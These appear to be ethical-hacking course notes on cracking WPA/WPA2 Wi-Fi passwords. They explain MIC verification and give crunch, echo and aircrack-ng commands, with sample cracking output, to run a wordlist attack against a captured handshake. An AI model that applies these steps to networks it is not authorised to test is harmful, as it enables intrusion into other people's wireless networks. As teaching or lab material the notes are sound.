# Section 06 - Network Hacking - Gaining Access (WEP/WPA/WPA2 Cracking)

## WPA/WPA2 Cracking - Using a Wordlist Attack

Two things are needed to crack WPA/WPA2:
1. 4-way handshake
1. Wordlist

`aircrack-ng` will unpack the handshake and extract the useful information: SP Address, STA Address, AP Nonce, STA Nonce, EAPOL, Payload and MIC. The Message Integrity Code (MIC) is used to verify whether a password is correct or not. `aircrack-ng` will mix all the other details with the password from the wordlist to generate a MIC and check if it matches the network one. If not, move on to the next password until a password succeeds or the wordlist is empty.

Now test the algorithm by appending a known password to your wordlist.

Generate a short wordlist with:
```bash
crunch 6 6 12 -o test.txt -t a@@@@b
```

Append your known password with:
```bash
echo <KNOWN_PASSWORD> >> test.txt
```

Finally, run `aircrack-ng` with:
```bash
aircrack-ng wpa_handshake-01.cap -w test.txt
```

Depending on the size of the wordlist and your processing power, `aircrack-ng` will succeed (or not) after a few seconds or a few hours:
```bash

                              Aircrack-ng 1.5.2 

      [00:00:00] 3/1 keys tested (244.68 k/s) 

      Time left: 0 seconds                                     300.00%

                          KEY FOUND! [ xxxxxxxxxxx ]


      Master Key     : E3 6F E6 0A BD 31 7C 69 B7 72 74 AB 33 C8 9F 4D 
                       37 64 FD 4E C9 65 B5 3D 7E AA 24 18 51 65 41 83 

      Transient Key  : CE 58 CC 44 3C 4E E7 8A 3B 09 81 04 03 B0 5A D6 
                       AE 3F D4 4B 05 78 4E E3 75 69 8B 69 17 C7 4D 45 
                       A9 7D BD 74 17 4A D2 2F C7 20 1C 30 14 DD 6A 93 
                       6D 33 73 8E A4 2D E1 64 89 FC 7B 20 CC 6D 5F 09 

      EAPOL HMAC     : A1 57 CE 9C 26 1A 17 F8 E4 33 CE 3B 8C 9B BF 98
```
